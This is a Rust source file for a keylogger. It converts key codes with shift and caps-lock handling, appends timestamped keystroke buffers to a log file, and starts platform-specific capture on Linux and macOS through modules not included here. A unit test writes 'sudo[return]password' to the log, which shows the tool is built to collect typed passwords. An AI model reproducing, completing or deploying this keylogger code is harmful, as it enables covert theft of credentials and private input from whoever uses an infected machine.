use std::{time::SystemTime, collections::HashMap, fs::{OpenOptions}, io::Write};
use anyhow::Result;
mod nix;
mod mac;


fn set_modifier(key_char: &str, shift: bool, capslock: bool, _ctrl: bool, _option: bool, _func: bool) -> Result<String> {
    // let special_chars = "1234567890[]/=\\;',.`";
    let shift_mapping: HashMap<&str, &str> = HashMap::from([
        ("1", "!"),
        ("2", "@"),
        ("3", "#"),
        ("4", "$"),
        ("5", "%"),
        ("6", "^"),
        ("7", "&"),
        ("8", "*"),
        ("9", "("),
        ("0", ")"),
        ("[", "{"),
        ("]", "}"),
        ("/", "?"),
        ("=", "+"),
        ("\\", "|"),
        ("'", "\""),
        (",", "<"),
        (".", ">"),
        ("`", "~"),
        ("-", "_"),
    ]);

    let mut res = key_char.clone().to_string();
    if shift && shift_mapping.contains_key(&key_char) {
        res = shift_mapping[&key_char].to_string();
    } else if shift || capslock {
        res = key_char.to_uppercase();
    }
    Ok(res)
}

fn log_keys_to_disk(captured_keys_buffer: String, log_file: String) -> Result<()> {
    let time_now: u64;
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(n) => time_now = n.as_secs(),
        Err(_) => panic!("SystemTime before UNIX EPOCH!"),
    }
    println!("{}", format!("{}: {}", time_now, captured_keys_buffer));
    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(log_file)
        .unwrap();

    write!(file, "{}", format!("{}: {}\n", time_now, captured_keys_buffer))?;
    Ok(())
}

pub(crate) fn start_keylogger(log_file: String, timeout: u64) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let keyboard_device_path = nix::nix_find_keyboard_device();
        let _res = nix::nix_log_keys(keyboard_device_path.unwrap(), log_file, timeout);    
    }
    #[cfg(target_os = "macos")]
    {
        let _res = mac::mac_log_keys(log_file, timeout);    
    }
    Ok(())
}


#[cfg(test)]
mod tests {
    use std::io::{BufReader, BufRead};

    use super::*;
    use tempfile::NamedTempFile;

    #[test]
    fn test_log_keys_to_disk() -> Result<()> {
        let tmp_file = NamedTempFile::new()?;
        let path = String::from(tmp_file.path().to_str().unwrap());
        let _res = log_keys_to_disk("sudo[return]password".to_string(), path);
        let file_reader = BufReader::new(tmp_file);
        let last_line = file_reader.lines().last().unwrap()?;
        assert!(last_line.contains(": sudo[return]password"));
        Ok(())
    }
    #[test]
    fn test_set_modifier() -> Result<()> {
        let mut res = set_modifier(&'c'.to_string(), true, false, false, false, false).unwrap();
        assert_eq!('C'.to_string(), res);
        res = set_modifier(&'-'.to_string(), true, false, false, false, false).unwrap();
        assert_eq!('_'.to_string(), res);
        res = set_modifier(&'a'.to_string(), false, false, false, false, false).unwrap();
        assert_eq!("a".to_string(), res);
        res = set_modifier(&'a'.to_string(), false, true, false, false, false).unwrap();
        assert_eq!("A".to_string(), res);
        Ok(())
    }
    #[test]
    fn test_get_key_hash_map() -> Result<()> {
        Ok(())
    }
}